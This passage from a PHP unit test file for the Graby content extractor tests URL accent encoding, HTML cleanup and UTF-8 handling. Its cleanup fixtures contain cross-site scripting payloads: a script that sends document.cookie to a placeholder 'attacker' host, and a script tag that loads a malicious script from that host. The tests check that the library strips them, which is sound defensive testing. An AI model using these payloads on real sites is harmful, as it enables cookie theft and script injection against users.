            'url with accent 1' => ['https://en.wikipedia.org/wiki/Café', 'https://en.wikipedia.org/wiki/Caf%C3%A9'],
            'url with accent 2' => ['http://www.atterres.org/article/budget-2016-les-10-méprises-libérales-du-gouvernement', 'http://www.atterres.org/article/budget-2016-les-10-m%C3%A9prises-lib%C3%A9rales-du-gouvernement'],
            'url with accent 3' => ['http://www.pro-linux.de/news/1/23430/linus-torvalds-über-das-internet-der-dinge.html', 'http://www.pro-linux.de/news/1/23430/linus-torvalds-%C3%BCber-das-internet-der-dinge.html'],
        ];
    }

    /**
     * @dataProvider dataWithAccent
     */
    public function testUrlWithAccent($url, $urlExpected)
    {
        $graby = new Graby();

        $reflection = new \ReflectionClass(get_class($graby));
        $method = $reflection->getMethod('validateUrl');
        $method->setAccessible(true);

        $res = $method->invokeArgs($graby, [$url]);

        $this->assertSame($urlExpected, $res);
    }

    public function dataForCleanupHtml()
    {
        return [
            'nothing' => [
                'html',
                'html',
                true,
            ],
            'only_meta' => [
                '<html><meta content="/assets/lol.jpg" property="og:image" /><meta content="http://www.io.lol" property="og:url"/></html>',
                '',
                true,
            ],
            'multiplepage1' => [
                '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul></html>',
                '<h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul>',
                true,
            ],
            'script' => [
                '<html><body><h2 class="primary">my title</h2><div class="story">my content<script>window.location="http://attacker/?cookie="+document.cookie</script></div></body></html>',
                '<h2 class="primary">my title</h2><div class="story">my contentwindow.location="http://attacker/?cookie="+document.cookie</div>',
                true,
            ],
            'script_location_removed_from_long_text' => [
                '<html><body><div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p><script>window.location="http://attacker/?cookie="+document.cookie</script><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div></body></html>',
                '<div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div>',
            ],
            'script_inject_removed_from_long_text' => [
                '<html><script src="http://attacker/malicious‑script.js"></script><body><div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div></body></html>',
                '<div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div>',
            ],
        ];
    }

    /**
     * @dataProvider dataForCleanupHtml
     */
    public function testCleanupHtml($html, $expected, $withLog = false)
    {
        $logger = new Logger('foo');
        $handler = new TestHandler();
        $logger->pushHandler($handler);

        $graby = new Graby(['debug' => true]);
        $graby->setLogger($logger);

        $cleanedHtml = $graby->cleanupHtml($html, 'http://0.0.0.0');

        $this->assertSame($expected, $cleanedHtml);

        if ($withLog) {
            $records = $handler->getRecords();

            $this->assertGreaterThan(1, $records);
        }
    }

    public function testEncodingUtf8ForTextPlainPage()
    {
        $reponse = new Response(
            200,
            [
                'content-type' => 'text/plain',
            ],
            Stream::factory(__DIR__ . '/fixtures/sites/malformed_UTF8_characters.txt')
        );
        $client = new Client();
        $client->getEmitter()->attach(new Mock([$reponse]));

        $graby = new Graby();
        $res = $graby->fetchContent('http://www.ais.org/~jrh/acn/text/ACN8-1.txt');

        $this->assertArrayHasKey('html', $res);
        $this->assertNotFalse(json_encode($res['html']), json_last_error_msg());
    }
}
